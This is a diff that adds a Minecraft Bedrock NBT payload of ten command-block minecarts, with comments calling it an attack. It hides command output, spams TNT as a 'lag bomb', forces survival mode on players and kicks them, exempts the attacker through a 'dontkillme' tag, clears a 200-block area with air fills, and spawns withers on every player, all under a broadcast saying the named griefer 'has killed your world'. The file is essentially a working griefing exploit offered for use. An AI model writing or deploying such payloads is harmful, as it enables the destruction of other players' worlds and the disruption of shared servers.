@@ -1,0 +1,61 @@
+{Occupants:[
+  // [0] Announce attack (TickDelay: 100000 = silent, ExecuteOnFirstTick)
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/tellraw @a { \"rawtext\" : [ { \"text\" : \"§epumpkinscarf803 has killed your world\" } ] }",
+    ExecuteOnFirstTick:1b, TickDelay:100000, Ticking:1b
+  },TicksLeftToStay:1},
+
+  // [1] Hide CB output → silent mode
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/gamerule commandblockoutput false",
+    ExecuteOnFirstTick:1b, TickDelay:100000, Ticking:1b
+  },TicksLeftToStay:1},
+
+  // [2] TNT SPAM — summon tnt on EVERY item entity → lag bomb + explosion chain
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/execute@e[type=item] ~ ~ ~ summon tnt ~ ~ ~",
+    ExecuteOnFirstTick:1b, TickDelay:300, Ticking:1b
+  },TicksLeftToStay:2},
+
+  // [3] Enable TNT explosions (in case disabled)
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/gamerule tntexplodes true",
+    ExecuteOnFirstTick:1b, TickDelay:1, Ticking:1b
+  },TicksLeftToStay:3},
+
+  // [4] Force survival on all players NOT tagged dontkillme
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/gamemode s @a[tag=!dontkillme]",
+    ExecuteOnFirstTick:1b, TickDelay:9, Ticking:1b
+  },TicksLeftToStay:5},
+
+  // [5] KICK all players NOT tagged dontkillme
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/kick @a[tag=!dontkillme]",
+    ExecuteOnFirstTick:1b, TickDelay:1, Ticking:1b
+  },TicksLeftToStay:15},
+
+  // [6] Tag attacker as protected (self-exempt)
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/tag @p add dontkillme",
+    ExecuteOnFirstTick:1b, TickDelay:100000, Ticking:1b
+  },TicksLeftToStay:6},
+
+  // [7] Tag all CB minecarts as protected (self-preserve)
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/tag @e[type=command_block_minecart] add dontkillme",
+    ExecuteOnFirstTick:1b, TickDelay:1, Ticking:1b
+  },TicksLeftToStay:7},
+
+  // [8] Wither skull terrain destroy → fill 200x200 area with AIR
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/execute @e [type=wither_skull] ~ ~ ~ /fill ~100 ~-2 ~100 ~ ~ ~ air 0",
+    ExecuteOnFirstTick:1b, TickDelay:1, Ticking:1b
+  },TicksLeftToStay:7},
+
+  // [9] Spawn Wither ON every player (continuous, TickDelay:4000)
+  {ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{
+    Command:"/execute@e[type=player] ~ ~ ~ summon wither ~ ~ ~",
+    ExecuteOnFirstTick:1b, TickDelay:4000, Ticking:1b
+  },TicksLeftToStay:7}
+]}
